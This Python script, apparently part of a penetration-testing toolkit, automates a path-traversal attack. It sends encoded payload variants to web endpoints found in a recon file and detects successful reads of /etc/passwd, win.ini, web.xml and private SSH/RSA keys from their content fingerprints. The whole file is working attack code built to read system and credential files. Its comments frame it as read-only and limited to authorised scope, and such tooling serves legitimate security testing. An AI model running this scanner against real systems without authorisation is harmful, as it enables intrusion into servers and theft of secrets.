# -*- coding: utf-8 -*-
"""hunt-path-traversal hunt 阶段：对入口试各编码族 payload，按内容指纹判活。

判活靠**读到越权文件内容**（如 /etc/passwd 的 root:x:0:0）或与基线的响应差异，不靠猜。
默认只做**读**探测；写/删 PoC 请在 validate 阶段按 scope 授权手工做（本脚本不写目标文件）。

用法:
  python hunt_pathtrav.py --input recon/endpoints.json --output candidates.json
      [--target-file etc/passwd] [--depth 8] [--dry-run]
"""
import argparse
import os
import re
import sys
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, load_json, save_json, http_probe  # noqa: E402

# 命中指纹：读到这些内容说明越权读成功
FINGERPRINTS = [
    (re.compile(r"root:.*:0:0:"), "/etc/passwd"),
    (re.compile(r"\[extensions\]|\[fonts\]", re.I), "win.ini"),
    (re.compile(r"<web-app|</web-app>", re.I), "web.xml"),
    (re.compile(r"BEGIN (RSA|OPENSSH) PRIVATE KEY"), "private key"),
]


def variants(target_file, depth):
    up = "../" * depth
    tf = target_file.lstrip("/")
    win = "..\\" * depth + "windows\\win.ini"
    return [
        ("naive", up + tf),
        ("url-slash", ("..%2f" * depth) + tf.replace("/", "%2f")),
        ("dotdot-encoded", ("%2e%2e%2f" * depth) + tf.replace("/", "%2f")),
        ("double-encoded", ("..%252f" * depth) + tf.replace("/", "%252f")),
        ("nested", ("....//" * depth) + tf),
        ("leading-abs", "/" + up + tf),
        ("qmark-trunc", up + tf + "?"),
        ("windows", win),
    ]


def build_url(ep, value):
    base, param = ep.get("url"), ep.get("param")
    if not param or param.startswith("<"):
        return None
    sep = "&" if "?" in base else "?"
    return "%s%s%s=%s" % (base, sep, param, quote(value, safe="%"))


def fetch_body(url, max_time=8):
    """path traversal 需要看 body，用 curl 直接取 body（http_probe 丢弃 body）。"""
    import subprocess
    try:
        p = subprocess.run(["curl", "-sS", "--max-time", str(max_time), url],
                           capture_output=True, text=True, timeout=max_time + 3)
        return p.stdout or ""
    except Exception as e:
        return "ERR:%s" % e


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--input", required=True)
    ap.add_argument("--output", required=True)
    ap.add_argument("--target-file", default="etc/passwd")
    ap.add_argument("--depth", type=int, default=8)
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--max-time", type=int, default=8)
    args = ap.parse_args()

    data = load_json(args.input)
    if not data:
        sys.exit("读不到 %s，先跑 recon.sh" % args.input)
    eps = [e for e in data.get("endpoints", []) if e.get("controllable")]
    cands = []
    for ep in eps:
        if not ep.get("param") or ep["param"].startswith("<"):
            cands.append({"endpoint": ep.get("url"), "param": ep.get("param"),
                          "family": "manual",
                          "signal": ["上传/无参入口，需人工做 zip-slip/symlink 写入验证"],
                          "suspected": False})
            continue
        base_len = None
        if not args.dry_run:
            b = fetch_body(build_url(ep, "hunt_baseline_%s" % args.target_file), args.max_time)
            base_len = len(b)
        for name, val in variants(args.target_file, args.depth):
            url = build_url(ep, val)
            if args.dry_run:
                print("[dry-run] %s | %s | %s" % (ep.get("param"), name, url)); continue
            body = fetch_body(url, args.max_time)
            hit = None
            for pat, label in FINGERPRINTS:
                if pat.search(body):
                    hit = label; break
            signal, suspected = [], False
            if hit:
                signal.append("读到越权文件指纹: %s" % hit); suspected = True
            elif base_len is not None and abs(len(body) - base_len) > 40:
                signal.append("响应长度差异(基线%d→%d)" % (base_len, len(body)))
            cands.append({"endpoint": ep.get("url"), "param": ep.get("param"),
                          "family": name, "payload": val, "probe_url": url,
                          "hit_file": hit, "resp_len": len(body),
                          "signal": signal or ["无明显信号"], "suspected": suspected})
    if args.dry_run:
        return
    save_json(args.output, {"target": data.get("target"), "target_file": args.target_file,
                            "candidates": cands})
    hit = sum(1 for c in cands if c.get("suspected"))
    log("生成候选 %d（%d 命中指纹）-> %s（validate 复核并保存越权内容为证据）"
        % (len(cands), hit, args.output))


if __name__ == "__main__":
    main()
